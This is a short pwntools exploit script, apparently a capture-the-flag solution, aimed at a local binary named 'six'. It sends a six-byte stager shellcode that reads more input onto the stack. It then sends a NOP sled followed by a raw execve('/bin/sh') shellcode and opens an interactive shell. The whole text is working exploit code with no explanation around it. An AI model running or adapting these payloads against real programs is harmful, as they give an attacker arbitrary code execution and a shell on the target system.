from pwn import *
p =process('./six')
context.log_level="debug"

p.readuntil('shellcode:')
shellcode="\x54\x5e\x89\xf2\x0f\x05"
'''
push    rsp 
pop     rsi
mov     edx, esi
syscall
'''

p.send(shellcode)

getshell="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
pause()
payload="\x90"*0xb36+getshell
p.sendline(payload)
p.interactive()
